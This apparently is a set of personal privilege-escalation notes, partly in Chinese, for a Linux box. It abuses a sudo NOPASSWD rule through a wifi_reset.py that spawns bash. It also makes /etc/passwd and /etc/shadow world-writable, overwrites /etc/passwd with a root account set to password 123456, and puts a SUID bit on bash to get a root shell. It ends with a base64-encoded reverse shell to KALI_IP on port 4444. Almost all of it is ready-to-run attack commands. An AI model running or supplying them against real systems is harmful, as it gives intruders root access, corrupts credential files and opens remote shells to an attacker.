```Plain
sudo /usr/bin/python /home/walter/wifi_reset.py
```

成功原因：

- 使用了完整的脚本路径
- 这个完整命令与sudo的NOPASSWD规则完全匹配

Here's the correct way to create the wifi_reset.py file with a single command:

```Plain
echo -e "import os\\nos.system('/bin/bash')" >
wifi_reset.py
```

Or alternatively, using single quotes to wrap the entire content:

```Plain
echo 'import os; os.system("/bin/bash")' >
wifi_reset.py


```

```Python
import os

def stop(text,value):
        os.system("chmod 777 /etc/passwd");

def reset(text,value):
        os.system("chmod +s /bin/bash");

def start(text,value):
        os.system("chmod 777 /etc/shadow");
```

add [wificontroller.py](http://wificontroller.py) if it missing this

```Python
echo "root:$(openssl passwd -1 -salt xyz 123456):0:0:root:/root:/bin/bash" > /etc/passwd
```

```Python
chmod +s /bin/bash
then /bin/bash -p
1. chmod +s /bin/bash
- 这是一个设置SUID (Set User ID) 权限位的命令
- 作用：
  - 给bash shell程序添加SUID权限位
  - 允许普通用户以文件所有者(通常是root)的权限执行该程序
  - 在文件权限中会显示为's'标志
- 执行后的效果：
  - bash程序会在执行时获得root权限
  - 任何用户执行这个bash都会以root身份运行
  - 这是一个常见的权限提升途径
2. /bin/bash -p
- 这是执行bash shell的命令，带有特殊的-p参数
- 作用：
  - -p 参数表示"privileged mode"（特权模式）
  - 保持SUID权限不被丢弃
  - 在bash有SUID位的情况下，保持root权限
```

```Bash
echo 'bash -i >& /dev/tcp/KALI_IP/4444 0>&1' | base64
# Copy the output and use:
echo "BASE64_OUTPUT" | base64 -d | bash
```